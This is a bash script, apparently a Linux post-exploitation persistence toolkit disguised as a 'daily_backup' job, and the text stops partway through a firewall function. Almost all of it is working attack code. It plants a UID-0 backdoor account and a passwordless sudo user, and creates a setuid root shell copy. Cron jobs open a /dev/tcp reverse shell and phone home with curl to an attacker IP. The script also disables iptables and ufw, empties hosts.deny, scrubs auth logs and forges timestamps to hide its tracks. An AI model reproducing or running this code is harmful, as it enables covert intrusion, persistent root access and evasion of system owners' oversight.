#!/bin/bash
# Copyright (C) 2015 Nathan Wray (m4dh4tt3r)
# Contributors: Benjamin Heise and Justin Wray (Sinister Syntax)

# Temporary Debugging
# 5 > /root/Destop/script.debug.txt
# BASH_XTRACEFD="5"
# PS4='$LINENO: '
# set -x

LOG="/tmp/.root/.home/.user/.daily_backup.log.$(date +%H.%M.%S_%d-%m-%Y)"
cmdList=("WHICH" "WGET" "NC" "SED" "CHMOD" "MKFIFO" "AWK" "MKDIR" "ID" "TOUCH" "GREP" "PGREP" "RM" "MV" "LN" "SYSCTL" "USERADD" "NETSTAT" "TAR" "SERVICE" "IPTABLES" "MD5SUM" "CRONTAB" "CP" "MAKE" "OPENSSL" "STAT" "BASE64" "CURL")

for (( i=0; i<${#cmdList[@]}; i++ ))
do
  # Converts argument to lowercase to match the actual command
  lowerCase=$(echo "${cmdList[${i}]}" | tr '[:upper:]' '[:lower:]')

  which "${lowerCase}" > /dev/null
  case $? in
    0)
      # Set local variable using argument from cmdList as the variable name,
      # then find the path of that variable, tr used to lowercase the cmdList
      # value
      # Example: cmdList[1] = "WHO", lowerCase = "who", "${WHO}" == "/bin/who"
      export "${cmdList[${i}]}"="$(which "${lowerCase}")"
      # Get the path from the local variable that was just set,
      # Example: cmdList[1] = "WHO", echo ${ + WHO + }, $(eval echo ${WHO}) == "/bin/who"
      cmdPath=$(eval echo "\${${cmdList[${i}]}}")
      {
        echo -e "\t* [${YELLOW}INFO${END}] => Command '${lowerCase}' exists at ${cmdPath}!"
        echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully set ${cmdList[${i}]} environment variable to ${cmdPath}!"
      } >> "${LOG}"
    ;;
    *)
      echo -e "\t- [${RED}FAILURE${END}] => Command: '${lowerCase}' does not exist on this target!" >> "${LOG}"
    ;;
  esac
done

# Global Variable Definitions
RPM=""
DPKG=""
YUM=""
APTGET=""
osType=""
getUser=""
attackIP=""
RED="\e[0;31m" 
GREEN="\e[0;32m"
YELLOW="\e[0;33m"
END="\e[0m"
targetIP=$(ifconfig | "${GREP}" inet | "${GREP}" -v inet6 | "${GREP}" -v 127| "${AWK}" -F":" '{ print $2 }' | "${AWK}" '{ print $1 }')
 
main () {
   if [ "$(${ID} -u)" != "0" ]
   then
      #attackIP=$(deobf "${attackIP}")
      attackIP="${attackIP}"

      # Gather node information
      # Uncomment if you are in an online environment
      #auditURL="https://github.com/CISOfy/lynis/archive/master.zip"
      # Comment out if you are in an online environment - For use in offline environments
      auditURL="http://${attackIP}/lynus/master.zip"

      if [ ! -d ~/Documents/.user/.audit ]
      then
        cd ~/ || exit 1

        "${MKDIR}" -p ~/Documents/.user/.audit
        if [ $? == 0 ]
        then
          echo -e "\t+ [${GREEN}SUCCESS${END}] => Directory ~/Documents/.user/.audit successfully created!"
        else
          echo -e "\t- [${RED}FAILURE${END}] => Failed to make directory ~/Documents/.user/.audit!"
        fi
      elif [ -d ~/Documents/.user/.audit ]
      then
        echo -e "\t* [${YELLOW}INFO${END}] => Directory ~/Documents/.user/.audit exists!"
      else
        echo -e "\t- [${RED}FAILURE${END}] => Failed to make directory ~/Documents/.user/.audit!"
      fi

      if [ -d ~/Documents/.user/.audit/lynis/ ]
      then
        echo -e "\t* [${YELLOW}INFO${END}] => Lynis already installed in ~/Documents/.user/.audit/lynis!"
      elif [ ! -d ~/Documents/.user/.audit/lynis/ ]
      then
        echo -e "\t* [${YELLOW}INFO${END}] => Lynis not installed, Attempting to download..."

        "${WGET}" -P ~/Documents/.user/.audit/ "${auditURL}" -o /dev/null
        cd ~/Documents/.user/.audit/ || exit 1
        $("${WHICH}" unzip) master.zip > /dev/null
        "${RM}" -rf master.zip
        "${MV}" lynis-master/ lynis/

        echo -e "\t+ [${GREEN}SUCCESS${END}] => Lynis has been installed, running system audit in the background!"
        "${TOUCH}" ~/Documents/.user/.audit/.lynis_log.txt
        ~/Documents/.user/.audit/lynis/lynis audit system -Q >> ~/Documents/.user/.audit/.lynis_log.txt &
      else
        echo -e "\t- [${RED}FAILURE${END}] => Could not determine if directory ~/Documents/.user/.audit/lynis exists!"
      fi
             
      echo -e "\t* [${YELLOW}INFO${END}] => User: $(whoami)"
      echo -e "\t* [${YELLOW}INFO${END}] => Hostname: $(hostname)"
      echo -e "\t* [${YELLOW}INFO${END}] => IP Addr: ${targetIP}"
      echo -e "\t* [${YELLOW}INFO${END}] => Architecture: $(uname -a)"
   elif [ "$(${ID} -u)" == "0" ]
   then
     if [ ! -d "/tmp/.root/.home/.user" ]
     then
       "${MKDIR}" -p "/tmp/.root/.home/.user"
     fi
     { echo "[+] Execution Time:"
       echo -e "\t* [${YELLOW}INFO${END}] => $(date +%d.%m.%Y"  "%H:%M:%S)"
       echo ""
       echo "[+] Detecting OS Release"
       getOS
       echo ""
       echo "[+] Ensuring Persistent /tmp"
       ensureTmp
       echo ""
       echo "[+] Adding User"
       addUser
       echo ""
       echo "[+] Adding Cron"
       addCron
       echo ""
       echo "[+] Adding Setuid Permissions"
       setUID
       echo ""
       echo "[+] Checking NoLogin Users"
       checkNoLogin
       echo ""
       echo "[+] Checking SSH"
       checkSSH
       echo ""
       echo "[+] Getting WebShell"
       getWebShell
       echo ""
       echo "[+] Setting Up System Monitor"
       sysMon
       echo ""
       echo "[+] Setting up Phone Home"
       phoneHome
       echo ""
       echo "[+] Checking Firewall"
       checkFW
       echo ""
       echo "[+] Modifying Firewall Rules"
       changeFW
       echo ""
       echo "[+] Adding Script to .bashrc"
       checkBash
       echo ""
       echo "[+] Checking hosts.deny"
       checkDeny
       echo ""
       echo "[+] Modifying Logs"
       fixLogs
       echo ""
       echo "[+] Writing KeyLogger (sshd)"
       writeSSH
       echo ""
       echo "[+] Clearing History"
       clearHist
     } > "${LOG}"
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not determine if user is root or a regular user (main)!"
     exit 1
   fi
}

# Checks /etc/hosts.deny for content
# If the size of /etc/hosts.deny is not less
# Than or equal to 1, then clear the contents.
# Cover tracks by keeping the original modification
# date.
checkDeny() {
   if [ ! -f /etc/hosts.deny ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /etc/hosts.deny does not exist!"
   elif [ -f /etc/hosts.deny ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /etc/hosts.deny does exist, Checking contents..."
     fileSize=$("${STAT}" -c%s "/etc/hosts.deny")
     if [ "${fileSize}" == "1" ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => /etc/hosts.deny has already been cleared!"
     elif [ "${fileSize}" != "1" ]
     then
       timestamp=$(getTime /etc/hosts.deny)
 
       > /etc/hosts.deny
       fileSize=$("${STAT}" -c%s "/etc/hosts.deny")
       case "${fileSize}" in
         0 | 1)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully cleared /etc/hosts.deny!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to modify /etc/hosts.deny!"
         ;;
       esac
       setTime "${timestamp}" /etc/hosts.deny
       verifyTime /etc/hosts.deny "${timestamp}"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to determine the size of /etc/hosts.deny!"
     fi
   else
     echo -e "\t- [${RED}FAILURE${END}] => Failed to determine if /etc/hosts.deny exists!"
   fi
}

# Creates a script called sysmon
# In /etc/cron.hourly that monitors
# Security logs for failed login attempts
# By a specially crafted user string sent
# By the attacker. Upon detection, the script
# Drops a listener on the target.
sysMon() {
   if [ -f /etc/cron.hourly/sysmon ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /etc/cron.hourly/sysmon script exists!"
   elif [ ! -f /etc/cron.hourly/sysmon ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /etc/cron.hourly/sysmon script does not exist...Attempting to create it!"
   
     {
       echo "#!/bin/bash"
       echo ""
       echo "# System Monitor - Monitors the system for failed ssh logins"
       echo ""
       echo -e "osType=\"\""
       echo ""
       echo "getOS() {"
       echo "   if [ -f /etc/redhat-release ]"
       echo "   then"
       echo -e "     osType=\"redhat\""
       echo "   elif [ -f  /etc/debian_version ]"
       echo "   then"
       echo -e "      osType=\"debian\""
       echo "   else"
       echo -e "      echo -e \"Failed to determine which Operating System is running!\""
       echo "      exit 1"
       echo "   fi"
       echo "}"
       echo ""
       echo "getOS"
       echo ""
       echo -e "logFile=\"\""
       echo ""
       echo -e "if [ \"\${osType}\" == \"redhat\" ]"
       echo "then"
       echo -e "  logFile=\"/var/log/secure\""
       echo -e "elif [ \"\${osType}\" == \"debian\" ]"
       echo "then"
       echo -e "  logFile=\"/var/log/auth.log\""
       echo "else"
       echo -e "  echo -e \"Failed to determine which Operating System is running!\""
       echo "fi"
       echo ""
       echo -e "grep -qiE 'sh-[0-9]{1,3}\.' \"\${logFile}\""
       echo -e "case \$? in"
       echo "  0)"
       echo -e "    userInfo=\$(grep -ioE 'sh-[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}-[0-9]{1,5}' \"\${logFile}\" | head -n 1)"
       echo -e "    userShell=\$(echo \"\${userInfo}\" | awk -F\"-\" '{ print \$1 }')"
       echo -e "    userAddr=\$(echo \"\${userInfo}\" | awk -F\"-\" '{ print \$2 }')"
       echo -e "    userPort=\$(echo \"\${userInfo}\" | awk -F\"-\" '{ print \$3 }')"
       echo ""
       echo -e "    \"\${userShell}\" -i >& /dev/tcp/\"\${userAddr}\"/\"\${userPort}\" 0<&1 2>&1"
       echo "  ;;"
       echo "  1)"
       echo -e "    echo \"No Login Found, exiting...\""
       echo "    exit 1"
       echo "  ;;"
       echo "  *)"
       echo -e "    echo \"Failed to grep for user in \"\${logFile}\", exiting...\""
       echo "    exit 1"
       echo "  ;;"
       echo "esac"
     } >> /etc/cron.hourly/sysmon
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not determine if /etc/cron.hourly/sysmon exists!"
   fi

   # Check OS version
   if [ "${osType}" == "redhat" ]
   then
     cronFile="/var/spool/cron/root"
   elif [ "${osType}" == "debian" ]
   then
     cronFile="/var/spool/cron/crontabs/root"
   else
     echo -e "\t* [${RED}FAILURE${END}] => Could not determine Operating System to set root's cron file!"
     exit 0
   fi

   # Check if cron file exists for root
   if [ ! -f "${cronFile}" ]
   then
     "${TOUCH}" "${cronFile}"
     if [ $? = 0 ]
     then
       echo -e "\t+ [${GREEN}SUCCES${END}] => Cron file successfully created!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Cron file failed to be created!"
     fi
   else
     echo -e "\t* [${YELLOW}INFO${END}] => Cron file exists!"
   fi

   # Check if cron job exists
   "${GREP}" -q 'sysmon' "${cronFile}"
   if [ $? == 0 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Cron job exists!"
   elif [ $? == 1 ]
   then
     "${CRONTAB}" -l | { cat; echo "5 * * * * /etc/cron.hourly/sysmon"; } | "${CRONTAB}" -
     case $? in
       0)
         echo -e "\t+ [${GREEN}SUCCES${END}] => Cron job successfully created!"
       ;;
       1)
         echo -e "\t- [${RED}FAILURE${END}] => Cron job failed to be created!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Could not determine if cron job was created or not!"
       ;;
     esac
   else
     echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred...Could not determine if cronjob exists!"
   fi

   # Check the file permissions on the sysmon script
   filePerms=$(${STAT} -c %a /etc/cron.hourly/sysmon)
   if [ "${filePerms}" == "755" ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Permissions have been set on /etc/cron.hourly/sysmon"
   else
     echo -e "\t* [${YELLOW}INFO${END}] => Permissions not set. Attempting to set them now..."
     chmod 755 /etc/cron.hourly/sysmon
     case $? in
       0)
         echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully set the permissions on /etc/cron.hourly/sysmon!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Failed to set permissions on /etc/cron.hourly/sysmon!"
       ;;
     esac
   fi
}

# Copies /bin/sh to a program
# Called /bin watcher. The script
# then sets a sticky bit on the file
# In hopes that if we can not get root back,
# We can get a root shell.
setUID() {
   if [ -f /bin/watcher ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /bin/watcher exists, Checking permissions..."

     watchPerms=$("${STAT}" -c "%a" /bin/watcher)
     if [ "${watchPerms}" == "4555" ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => /bin/watcher permissions correctly set: ${watchPerms}!"
     elif [ "${watchPerms}" != "4555" ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => /bin/watcher permissions not set, Attempting to correct..."
 
       "${CHMOD}" 4555 /bin/watcher

       watchPerms=$("${STAT}" -c "%a" /bin/watcher)
       case "${watchPerms}" in
         4555)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully added setuid to /bin/watcher (bash shell)!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to set correct permissions on /bin/watcher (4555)!"
         ;;
       esac
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to determine /bin/watcher's permissions!"
     fi
   elif [ ! -f /bin/watcher ]
   then
     "${CP}" -f /bin/sh /bin/watcher
     if [ -f /bin/watcher ]
     then
       "${CHMOD}" 4555 /bin/watcher
    
       watchPerms=$("${STAT}" -c "%a" /bin/watcher)
       case "${watchPerms}" in
         4555)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully added setuid to /bin/watcher (bash shell)!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to set correct permissions on /bin/watcher (4555)!"
         ;;
       esac
     else
       echo -e "\t- [${RED}FAILURE${END}] => Failed to determine if /bin/watcher exists!"
     fi
   else
      echo -e "\t- [${RED}FAILURE${END}] => Failed to determine if /bin/watcher exists!"
   fi
}

# Checks various OS files for the
# Deletion time of /tmp/. Then it modifies
# the value to be infinite or large.
ensureTmp() {
   if [ "${osType}" == "redhat" ]
   then
     tmpDir="/etc/cron.daily/tmpwatch"
     "${GREP}" -q "100000d /tmp" "${tmpDir}"
     case $? in
       0)
         echo -e "\t* [${YELLOW}INFO${END}] => tmpwatch already set to infinite!"
       ;;
       1)
         echo -e "\t* [${YELLOW}INFO${END}] => tmpwatch not set, Attempting to set..."
  
         "${SED}" -i "s/10d \/tmp/100000d \/tmp/g" "${tmpDir}"
         "${GREP}" -q "100000d /tmp" "${tmpDir}"
         case $? in
           0)
             echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully added 100000d to ${tmpDir}!"
           ;;
           *)
             echo -e "\t- [${RED}FAILURE${END}] => Could not determine if tmp deletion was set or not in ${tmpDir}!"
           ;;
         esac
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Could not determine if 100000d was set or not in ${tmpDir}!"
       ;;
     esac
   elif [ "${osType}" == "debian" ]
   then
     tmpDir="/etc/default/rcS"
     "${GREP}" -q "TMPTIME=-1" "${tmpDir}"
     case $? in
       0)
         echo -e "\t* [${YELLOW}INFO${END}] => TMPTIME already set to infinite!"
       ;;
       1)
         echo -e "\t* [${YELLOW}INFO${END}] => TMPTIME not set, Attempting to set..."
 
         "${SED}" -i "s/TMPTIME\=[0-9]*/TMPTIME\=-1/g" "${tmpDir}"
         "${GREP}" -q "TMPTIME=-1" "${tmpDir}"
         case $? in
           0)
             echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully added TMPTIME=-1 to ${tmpDir}!"
           ;;
           *)
             echo -e "\t- [${RED}FAILURE${END}] => Could not determine if TMPTIME was set or not in ${tmpDir}!"
           ;;
         esac
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => Could not determine if TMPTIME was set or not in ${tmpDir}!"
       ;;
     esac
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not determine Operating System!"
   fi
}

# Function to get the OS version of the target
getOS() {
   if [ -f /etc/redhat-release ]
   then
     osType="redhat"
     echo -e "\t* [${YELLOW}INFO${END}] => OS Detected: ${osType}"
   elif [ -f /etc/debian_version ]
   then
     osType="debian"
     echo -e "\t* [${YELLOW}INFO${END}] => OS Detected: ${osType}"
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not determine the installed Operating System!"
   fi
   if [ "${osType}" == "redhat" ]
   then
     RPM=$("${WHICH}" rpm)
     YUM=$("${WHICH}" yum)
   elif [ "${osType}" == "debian" ]
   then
     DPKG=$("${WHICH}" dpkg)
     APTGET=$("${WHICH}" apt-get)
   else
     echo -e "\t- [${RED}FAILURE${END}] => Failed to determine the Operating System!"
   fi
}

# Gets the timestamp of a defined file
getTime() {
   timestamp=$("${STAT}" -c "%Y" "${1}")
   echo "${timestamp}"
}

# Modifies the modified timestamp
setTime() {
   timestamp="${1}"
   filename="${2}"
   "${TOUCH}" -d "@${timestamp}" "${filename}"
}

# Verifies the timestamp was modified successfully
verifyTime() {
   newTime=$(getTime "${1}")
   oldTime="${2}"
 
   # Alert Status on Time Modification
   if [ "${newTime}" != "${oldTime}" ]
   then
      { echo -e "\t- [${RED}FAILURE${END}] => Timestamp modification failed!"
        echo -e "\t* [${YELLOW}INFO${END}] => Original Timestamp: ${oldTime}"
        echo -e "\t* [${YELLOW}INFO${END}] => New Timestamp: ${newTime}"
      } >> "${LOG}"
   else
      echo -e "\t+ [${GREEN}SUCCESS${END}] => Timestamp modified successfully for ${1}!" >> "${LOG}"
   fi
   echo ""
}

# Used to verify the administrator
# Account was added to the system.
# Used in addUser().
statusCheck() {
   RETVAL=$?

   # First Stage Verification
   if [ ${RETVAL} == 0 ]
   then
      echo -e "\t+ [${GREEN}SUCCESS${END}] => ${1}"
   else
      echo -e "\t- [${RED}FAILURE${END}] => ${2}"
   fi

   # Second Stage Verification
   secStage=$("${GREP}" "^administrator" "${3}")
   echo -e "\t* [${YELLOW}INFO${END}] => Added \"${secStage}\" to ${3}"
 
   "${GREP}" "^administrator" "${3}" >> /dev/null
   if [ ${RETVAL} == 0 ]
   then
      echo -e "\t+ [${GREEN}SUCCESS${END}] => Verification Passed - ${3}"
   else
      echo -e "\t- [${RED}FAILURE${END}] => Verification Failed - Manual Check Required"
   fi
}

# Add an administrator user to
# The target system.
addUser() {
   # Get Timestamp of /etc/passwd
   timestamp1=$(getTime "/etc/passwd")
   timestamp2=$(getTime "/etc/shadow")
 
   getent passwd | "${GREP}" "^administrator" > /dev/null
   if [ $? -eq 0 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Administrator user already added to the target!"
   else
     echo -e "\t* [${YELLOW}INFO${END}] => Administrator user not found, did you add it?"
     echo -e "\t* [${YELLOW}INFO${END}] => Checking if Administrator was specified..."

     if [ "${getUser}" == "root" ]
     then
       # Add root user to target system
       "${USERADD}" -d "/tmp/.root/.home/.user/" -g 0 -l -N -o -p "$(echo 'toor' | "${OPENSSL}" passwd -1 -stdin)" -r -s "/bin/bash" -u 0 administrator
       statusCheck "Added administrator to /etc/passwd" "Failed to add administrator to /etc/passwd" "/etc/passwd"
     fi
   fi

   getent passwd | "${GREP}" "^mrjohns" > /dev/null
   if [ $? -eq 0 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => User mrjohns already added to the target!"
   else
     echo -e "\t* [${YELLOW}INFO${END}] => User mrjohns not found, did you add it?"
     echo -e "\t* [${YELLOW}INFO${END}] => Checking if mrjohns was specified..."

     if [ "${getUser}" == "user" ]
     then
       # Add user to target system
       "${USERADD}" -d "/home/mrjohns/" -l -p "$(echo 'toor' | "${OPENSSL}" passwd -1 -stdin)" -s "/bin/bash" -m mrjohns
       statusCheck "Added mrjohns to /etc/passwd" "Failed to add mrjohns to /etc/passwd" "/etc/passwd"
     fi
   fi


   setTime "${timestamp1}" "/etc/passwd"
   verifyTime "/etc/passwd" "${timestamp1}"

   statusCheck "Added user to /etc/shadow" "Failed to add user to /etc/shadow" "/etc/shadow"

   setTime "${timestamp2}" "/etc/shadow"
   verifyTime "/etc/shadow" "${timestamp2}"
 
   timestamp=$(getTime "/etc/sudoers")

   if [ "${getUser}" == "user" ]
   then
     # Add user to suoders
     "${SED}" -i '/^root/a mrjohns ALL= NOPASSWD: ALL' "/etc/sudoers"
     statusCheck "User mrjohns successfully added to /etc/sudoers" "User mrjohns was not added to /etc/sudoers" "/etc/sudoers"
   fi

   setTime "${timestamp}" "/etc/sudoers"
   verifyTime "/etc/sudoers" "${timestamp}"

   # Clear log of added user
   if [ "${osType}" == "redhat" ]
   then
     logFile="/var/log/secure"
     timestamp=$(getTime "${logFile}")
   elif [ "${osType}" == "debian" ]
   then
     logFile="/var/log/auth.log"
     timestamp=$(getTime "${logFile}")
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not determine the Operating System installed!"
   fi

   grep -q "useradd" "${logFile}"
   case $? in
     0)
       echo -e "\t* [${YELLOW}INFO${END}] => Useradd found in ${logFile}...Attempting to remove!"

       sed -i '/useradd/d;/administrator/d;/mrjohns/d' "${logFile}"
       case $? in
         0)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully cleared ${logFile} of useradd!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to remove useradd from ${logFile}!"
         ;;
       esac

       setTime "${timestamp}" "${logFile}"
       verifyTime "${logFile}" "${timestamp}"
     ;;
     1)
       echo -e "\t* [${YELLOW}INFO${END}] => Couldn't find useradd in ${logFile}!"
     ;;
     *)
       echo -e "\t- [${RED}FAILURE${END}] => Could not determine if ${logFile} contains useradd!"
     ;;
   esac
}

# Add a cron job to run this script
# Every 5 minutes to maintain access
addCron() {
   if [ ! -f "/etc/cron.daily/daily_backup.sh" ]
   then
     "${CP}"  "/tmp/.root/.home/.user/daily_backup.sh" "/etc/cron.daily/daily_backup.sh"
  
     if [ $? = 0 ]
     then
       echo -e "\t+ [${GREEN}SUCCES${END}] => Script successfully copied!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Script failed to be copied!"
     fi
   else
     origScript=$("${MD5SUM}" "/tmp/.root/.home/.user/daily_backup.sh" | "${AWK}" '{ print $1 }')
     copyScript=$("${MD5SUM}" "/etc/cron.daily/daily_backup.sh" | "${AWK}" '{ print $1 }')

     if [ "${origScript}" == "${copyScript}" ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => Backup file exists!"
     elif [ "${origScript}" != "${copyScript}" ]
     then
       "${CP}"  "/tmp/.root/.home/.user/daily_backup.sh" "/etc/cron.daily/daily_backup.sh"
       if [ $? = 0 ]
       then
         echo -e "\t+ [${GREEN}SUCCES${END}] => Script successfully updated!"
       else
         echo -e "\t- [${RED}FAILURE${END}] => Script failed to be copied!"
       fi
     else
       echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
     fi
   fi

   checkPerm=$("${STAT}" -c "%a %n" /etc/cron.daily/daily_backup.sh | "${AWK}" '{ print $1 }')
   if [ "${checkPerm}" != "755" ]
   then
     "${CHMOD}" 755 "/etc/cron.daily/daily_backup.sh"
     if [ $? = 0 ]
     then
       echo -e "\t+ [${GREEN}SUCCES${END}] => Script successfully made executable!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Script failed to be made executable!"
     fi
   else
     echo -e "\t* [${YELLOW}INFO${END}] => Permissions already set!"
   fi

   if [ "${osType}" == "redhat" ]
   then
     cronFile="/var/spool/cron/root"
   elif [ "${osType}" == "debian" ]
   then
     cronFile="/var/spool/cron/crontabs/root"
   else
     echo -e "\t* [${RED}FAILURE${END}] => Could not determine Operating System to set root's cron file!"
   fi

   # Check if cron file exists for root
   if [ ! -f "${cronFile}" ]
   then
     "${TOUCH}" "${cronFile}"
     if [ $? = 0 ]
     then
       echo -e "\t+ [${GREEN}SUCCES${END}] => Cron file successfully created!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => Cron file failed to be created!"
     fi
   else
     echo -e "\t* [${YELLOW}INFO${END}] => Cron file exists!"
   fi

   # Check if cron job exists
   "${GREP}" -q 'daily_backup.sh' "${cronFile}"
   if [ $? == 0 ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => Cron job exists!"
   elif [ $? == 1 ]
   then
     "${CRONTAB}" -l | { cat; echo "5 * * * * /etc/cron.daily/daily_backup.sh -i ${attackIP} >> /tmp/.root/.home/.user/.$(date +%H.%M.%S_%d-%m-%Y).log"; } | "${CRONTAB}" -
     case $? in
       0)
         echo -e "\t+ [${GREEN}SUCCES${END}] => Cron job successfully created!"
       ;;
       1)
         echo -e "\t- [${RED}FAILURE${END}] => Cron job failed to be created!"
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
       ;;
     esac
   else
     echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
   fi
}

# Set up a cronjob called snort
# That sets up phone home functionality.
# Used in conjunction with the snort.php file.
phoneHome() {
   #attackIP=$(deobf "${attackIP}")
   attackIP="${attackIP}"
   obfString=$(obf "~xXxGen<Owned By G0dz1ll4>GenxXx~")

   if [ -f /etc/cron.hourly/snort ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /etc/cron.hourly/snort script exists!"
   elif [ ! -f /etc/cron.hourly/snort ]
   then
     echo -e "\t* [${YELLOW}INFO${END}] => /etc/cron.hourly/snort script does not exist...Attempting to create it!"
     { echo "#!/bin/bash"
       echo ""
       echo "# Snort Monitoring Script - Feeds data to Snort IDS"
       echo ""
       echo -e "${CURL} -s -d \"token=eFh4R2VuPE93bmVkIEJ5IEcwZHoxbGw0PkdlbnhYeA==\" -A \"H4x0r Lit3 - Ph0n3H0m3 v1.0\"  http://${attackIP}/snort.php > /dev/null"
       echo "case $? in" 
       echo "  0)"
       echo -e "    echo -e \"\t+ [${GREEN}SUCCESS${END}] => Successfully sent data to Snort - \$(date +%H.%M.%S\" \"%d-%m-%Y).log!\" >> /tmp/.root/.home/.user/.snort.log"
       echo "  ;;"
       echo "  1)"
       echo -e "    echo -e \"\t+ [${RED}FAILURE${END}] => Failed to sent data to Snort!\" >> /tmp/.root/.home/.user/.snort.log"
       echo "  ;;"
       echo "  *)"
       echo -e "    echo -e \"\t+ [${RED}FAILURE${END}] => An unexpected error has occurred...Cannot determine if data was sent to Snort!\" >> /tmp/.root/.home/.user/.snort.log"
       echo "  ;;"
       echo "esac"
     } > /etc/cron.hourly/snort

     if [ "${osType}" == "redhat" ]
     then
       cronFile="/var/spool/cron/root"
     elif [ "${osType}" == "debian" ]
     then
       cronFile="/var/spool/cron/crontabs/root"
     else
       echo -e "\t* [${RED}FAILURE${END}] => Could not determine Operating System to set root's cron file!"
     fi

     # Check if cron file exists for root
     if [ ! -f "${cronFile}" ]
     then
       "${TOUCH}" "${cronFile}"
       case $? in
         0)
           echo -e "\t+ [${GREEN}SUCCES${END}] => Cron file successfully created!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Cron file failed to be created!"
         ;;
       esac
     else
       echo -e "\t* [${YELLOW}INFO${END}] => Cron file exists!"
     fi

     # Check if cron job exists
     "${GREP}" -q 'snort' "${cronFile}"
     case $? in
       0)
         echo -e "\t* [${YELLOW}INFO${END}] => Cron job exists!"
       ;;
       1)
         "${CRONTAB}" -l | { cat; echo "5 * * * * /etc/cron.hourly/snort"; } | "${CRONTAB}" -
         case $? in
           0)
             echo -e "\t+ [${GREEN}SUCCES${END}] => Cron job successfully created!"
           ;;
           1)
             echo -e "\t- [${RED}FAILURE${END}] => Cron job failed to be created!"
           ;;
           *)
             echo -e "\t- [${RED}FAILURE${END}] => Could not determine if cron job was created or not!"
           ;;
         esac
       ;;
       *)
         echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred...Could not determine if cronjob exists!"
       ;;
     esac

     # Check script permissions
     filePerms=$(${STAT} -c %a /etc/cron.hourly/snort)
     if [ "${filePerms}" == "755" ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => Permissions have been set on /etc/cron.hourly/snort"
     else
       echo -e "\t* [${YELLOW}INFO${END}] => Permissions not set. Attempting to set them now..."
       chmod 755 /etc/cron.hourly/snort
       case $? in
         0)
           echo -e "\t+ [${GREEN}SUCCESS${END}] => Successfully set the permissions on /etc/cron.hourly/snort!"
         ;;
         *)
           echo -e "\t- [${RED}FAILURE${END}] => Failed to set permissions on /etc/cron.hourly/snort!"
         ;;
       esac
     fi
   fi
}

# Check if the firewall is running
checkFW() {
   if [ "${osType}" == "redhat" ]
   then
     "${PGREP}" "${IPTABLES}" > /dev/null
 
     if [ $? == 0 ]
     then
       "${SERVICE}" iptables stop
       if [ $? == 0 ]
       then
         echo -e "\t+ [${GREEN}SUCCES${END}] => IP tables successfully stopped!"
       else
         echo -e "\t- [${RED}FAILURE${END}] => IP tables could not be stopped!"
       fi
     elif [ $? == 1 ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => IP tables is not running!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => An unexpected error has occurred!"
     fi
   elif [ "${osType}" == "debian" ]
   then
     md5Val=$("${IPTABLES}" -L | "${MD5SUM}" - | "${AWK}" '{ print $1 }')
     if [ "${md5Val}" == "f2384cfbed4d4fb64061368c4128d7ea" ]
     then
       echo -e "\t* [${YELLOW}INFO${END}] => IP tables is running!"
     else
       echo -e "\t- [${RED}FAILURE${END}] => IP tables not correct. Needs modification!"
     fi
   else
     echo -e "\t- [${RED}FAILURE${END}] => Could not detect Operating System!"
   fi

   if [ "${osType}" == "debian" ]
   then
     # Check for ufw
     "${DPKG}" -l | "${GREP}" ufw > /dev/null
     case $? in
       0)
         echo -e "\t* [${YELLOW}INFO${END}] => ufw is installed...Checking if it is running!"

         "${PGREP}" ufw > /dev/null
         case $? in
           0)
             echo -e "\t* [${YELLOW}INFO${END}] => ufw is running...Attempting to stop!"
             "${SERVICE}" ufw stop > /dev/null

             "${PGREP}" ufw > /dev/null
             case $? in
               0)
